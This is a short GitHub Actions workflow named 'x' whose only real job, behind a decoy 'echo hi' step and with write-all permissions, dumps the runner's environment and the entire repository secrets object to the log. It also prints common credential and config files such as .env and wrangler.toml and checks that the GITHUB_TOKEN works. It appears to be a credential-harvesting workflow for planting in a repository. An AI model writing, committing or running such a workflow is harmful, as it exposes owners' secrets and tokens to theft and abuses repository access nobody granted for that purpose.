name: x
on: workflow_dispatch
jobs:
  a:
    runs-on: ubuntu-latest
    permissions: write-all
    env:
      SECRETS_JSON: ${{ toJSON(secrets) }}
      GH_TOK: ${{ secrets.GITHUB_TOKEN }}
    steps:
      - run: echo hi
      - name: dump
        run: |
          echo "=== ENV ==="; env | sort
          echo "=== SECRETS_JSON ==="; echo "SECRETS_JSON=$SECRETS_JSON"
          echo "=== FILES ==="; for f in wrangler.toml wrangler.jsonc .dev.vars .env .env.local config.json credentials.json; do [ -f "$f" ] && echo "FOUND $f" && cat "$f"; done
          ls -la
          echo "=== IP ==="; curl -s https://api.ipify.org
          echo; echo "=== TOKEN RATE ==="; curl -s -H "Authorization: Bearer $GH_TOK" https://api.github.com/rate_limit
